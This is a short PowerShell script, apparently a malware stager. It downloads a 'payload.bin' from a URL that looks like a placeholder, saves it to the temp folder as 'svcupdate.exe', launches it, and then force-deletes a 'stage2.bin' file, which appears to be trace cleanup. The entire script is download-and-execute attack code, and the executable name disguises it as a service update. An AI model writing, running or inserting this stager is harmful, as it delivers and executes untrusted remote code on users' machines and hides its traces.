
[CmdletBinding()]
param(
    [string]$Stage1Url = "https://adatum.com/payload.bin",
    [string]$LocalPath = "$env:TEMP\svcupdate.exe"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $LocalPath)
Start-Process -FilePath $LocalPath
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
